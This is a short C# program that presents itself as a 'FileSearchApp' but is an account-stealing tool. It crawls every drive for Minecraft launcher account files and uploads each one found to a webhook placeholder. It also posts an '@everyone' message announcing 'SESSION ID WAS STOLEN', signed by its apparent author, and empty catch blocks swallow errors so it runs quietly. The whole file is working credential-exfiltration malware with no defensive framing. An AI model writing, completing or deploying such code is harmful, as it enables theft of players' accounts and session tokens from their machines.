using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;

namespace FileSearchApp
{
    class Program
    {
        static async Task Main(string[] args)
        {
            string[] targetFileNames = { "launcher_profiles.json", "TlauncherProfiles.json", "accounts.json" };
            string webhookUrl = "WEBHOOK_GOES_HERE";

            foreach (string drive in Directory.GetLogicalDrives())
            {
                await SearchDirectoriesAsync(drive, targetFileNames, webhookUrl);
            }
        }

        static async Task SearchDirectoriesAsync(string directory, string[] targetFileNames, string webhookUrl)
        {
            try
            {
                foreach (string file in Directory.GetFiles(directory).Where(f => targetFileNames.Contains(Path.GetFileName(f))))
                {
                    await SendFileFoundMessage(webhookUrl);
                    await SendFileWithEmbedToWebhookAsync(webhookUrl, file);
                }

                foreach (string subDirectory in Directory.GetDirectories(directory))
                {
                    await SearchDirectoriesAsync(subDirectory, targetFileNames, webhookUrl);
                }
            }
            catch (Exception ex)
            {
            }
        }

        static async Task SendFileFoundMessage(string webhookUrl)
        {
            using (HttpClient client = new HttpClient())
            {
                var content = new
                {
                    content = "||@everyone|| `` SESSION ID WAS STOLEN `` ||MADE BY 1NJ1N3R4||"
                };

                await client.PostAsync(webhookUrl, new StringContent(Newtonsoft.Json.JsonConvert.SerializeObject(content), System.Text.Encoding.UTF8, "application/json"));
            }
        }

        static async Task SendFileWithEmbedToWebhookAsync(string webhookUrl, string filePath)
        {
            using (HttpClient client = new HttpClient())
            {
                var content = new MultipartFormDataContent();
                var fileStream = File.OpenRead(filePath);
                var fileContent = new StreamContent(fileStream);
                content.Add(fileContent, "file", Path.GetFileName(filePath));
                var embed = new
                {
                    title = "File Found",
                    description = $"Found file: {Path.GetFileName(filePath)}",
                    color = 0x00ff00
                };

                content.Add(new StringContent(Newtonsoft.Json.JsonConvert.SerializeObject(embed)), "embed");

                await client.PostAsync(webhookUrl, content);
            }
        }
    }
}
